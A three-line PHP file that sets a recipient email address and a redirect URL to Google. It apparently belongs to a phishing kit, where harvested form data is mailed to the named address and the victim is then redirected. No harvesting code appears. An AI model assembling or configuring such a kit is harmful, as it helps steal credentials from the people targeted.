<?php 
$Receive_email="askformoore@protonmail.com";
$redirect="https://www.google.com/";
?>